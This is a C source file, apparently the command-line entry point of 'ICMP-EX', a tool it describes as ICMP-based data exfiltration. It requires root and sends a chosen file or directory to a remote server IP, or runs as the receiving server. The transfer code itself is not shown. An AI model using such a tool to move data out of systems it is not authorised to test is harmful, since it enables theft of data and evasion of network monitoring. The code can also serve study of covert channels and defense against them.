#include "icmp.h"

void handler(int sig)
{
    fprintf(stdout, "\033[0;31m\nProcess Killed (%d)\033[0m\n", sig);
    exit(EXIT_FAILURE);
}

void help(char *argv)
{
    fprintf(stdout, "\033[0;31mICMP-EX : ICMP-Based data exfiltration\n");
    fprintf(stdout, "\033[0mUsage : %s [-c <server IP> || -s] [-f <file path> || " "-d <directory path>]  \n\n", argv);
    fprintf(stdout, "-s, --server\n");
    fprintf(stdout, "\tServer mode (default value) : Receive Data\n");
    fprintf(stdout, "\t\033[0;33m[Incompatible with -c, --client]\033[0m\n\n");
    fprintf(stdout, "-c, --client <server IP>\n");
    fprintf(stdout, "\tClient mode : Send Data\n");
    fprintf(stdout, "\t\033[0;33m[Incompatible with -s, --server]\033[0m\n\n");
    fprintf(stdout, "-f, --file <file path>\n");
    fprintf(stdout, "\tClient Only: specified data file to transfer\n");
    fprintf(stdout, "\t\033[0;33m[Incompatible with -d, --directory]\033[0m\n\n");
    fprintf(stdout, "-d, --directory <directory path>\n");
    fprintf(stdout, "\tClient Only: specified directory, each file in the specified " "directory will be extracted (not recursivly)\n");
    fprintf(stdout, "\t\033[0;33m[Incompatible with -f, --file]\033[0m\n\n");
}

int main(int argc, char *argv[])
{
    signal(SIGINT, handler);
    if (getuid() != 0)
    {
        fprintf(stderr, "\033[0;31m[+] Vous devez être root pour pouvoir lancer ce programme\033[0m\n");
        return EXIT_FAILURE;
    }

    if (argc > 1)
    {
        if ((strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)
            && argc == 2)
        {
            help(argv[0]);
            return EXIT_SUCCESS;
        }
        else if ((strcmp(argv[1], "-c") == 0 || strcmp(argv[1], "--client") == 0) && argc == 5)
        {
            if (strcmp(argv[3], "-f") == 0 || strcmp(argv[3], "--file") == 0)
            {
                char *ip = argv[2];
                check_ipv4(ip);
                const char *path = argv[4];
                run_client(ip, path, 1);
            }
            else if (strcmp(argv[3], "-d") == 0 || strcmp(argv[3], "--directory") == 0)
            {
                const char *ip = argv[2];
                const char *path = argv[4];
                run_client(ip, path, 0);
            }
            else
            {
                fprintf(stderr, "Invalid client arguments.\n");
                return EXIT_FAILURE;
            }
        }
        else if ((strcmp(argv[1], "-s") == 0 || strcmp(argv[1], "--server") == 0) && argc == 2)
        {
            run_server();
        }
        else
        {
            fprintf(stderr, "Unknown option or invalid argument count.\n");
            return EXIT_FAILURE;
        }
    }
    else
    {
        run_server();
    }

    return 0;
}
